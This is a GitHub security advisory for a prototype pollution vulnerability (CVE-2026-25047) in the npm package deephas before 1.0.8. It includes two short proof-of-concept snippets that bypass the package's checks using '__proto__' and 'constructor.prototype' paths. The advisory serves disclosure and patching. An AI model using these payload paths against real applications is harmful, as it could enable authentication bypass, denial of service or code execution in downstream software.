# [C] deepHas vulnerable to Prototype Pollution via constructor.prototype

## Summary
Severity: Critical
Advisory: GHSA-2733-6c58-pf27
CVE: CVE-2026-25047
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-01-29
Source: https://github.com/advisories/GHSA-2733-6c58-pf27
Type: github-advisory

## Affected
- npm: `deephas` — affected >=0 <1.0.8

## Details
### Summary
A prototype pollution vulnerability exists in version 1.0.7 of the deephas npm package that allows an attacker to modify global object behavior. This issue was fixed in version 1.0.8.

### Details
The vulnerability resides in the `add()` function and `indexer()` function implemented within `deepHas.js`. Although version 1.0.7 attempts to prevent prototype pollution by checking property ownership (e.g., using Object.hasOwnProperty) and by checking against forbidden string usage (using String.prototype.indexOf), this check can be bypassed as shown in the PoC

By doing so, an attacker can inject properties into Object.prototype through a payload such as constructor.prototype.polluted or __proto__.polluted resulting in prototype pollution.

This issue affects all JavaScript runtimes that rely on npm packages (including Node.js, Deno, and Bun) and is independent of the operating system.

### PoC
#### Steps to reproduce
1. Install version 1.0.7 of `deephas` using npm install
2. Run one of the following code snippets:

```javascript
//PoC 1
Object.prototype.hasOwnProperty = () => true;
console.log({}.polluted);
const dh = require('deephas');
let obj = {};
dh.set(obj, 'constructor.prototype.polluted', 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }'); // prints yes => the patch is bypassed and prototype pollution occurred
```
OR

```javascript
//PoC 2
String.prototype.indexOf = () => -1;
console.log({}.polluted);
const dh = require('deephas');
let obj = {};
dh.set(obj, '__proto__.polluted', 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }'); // prints yes => the patch is bypassed and prototype pollution occurred
```

#### Expected behavior
Prototype pollution should be prevented and {} should not gain new properties.
This should be printed on the console:
```
undefined
undefined OR throw an Error
```

#### Actual behavior
Object.prototype is polluted and the property polluted becomes globally accessible.
This is printed on the console:
```
undefined
yes
```

### Impact
This is a prototype pollution vulnerability, which can have severe security implications depending on how deephas is used by downstream applications. Any application that processes attacker-controlled input using `deephas.set` may be affected.
It could potentially lead to the following problems:
1. Authentication bypass
2. Denial of service
4. Remote code execution (if polluted property is passed to sinks like eval or child_process)

## References
- https://github.com/sharpred/deepHas/security/advisories/GHSA-2733-6c58-pf27
- https://nvd.nist.gov/vuln/detail/CVE-2026-25047
- https://github.com/sharpred/deepHas/commit/8097fafd3776c613d8066546653e0d2c7b5fc465
- https://github.com/sharpred/deepHas
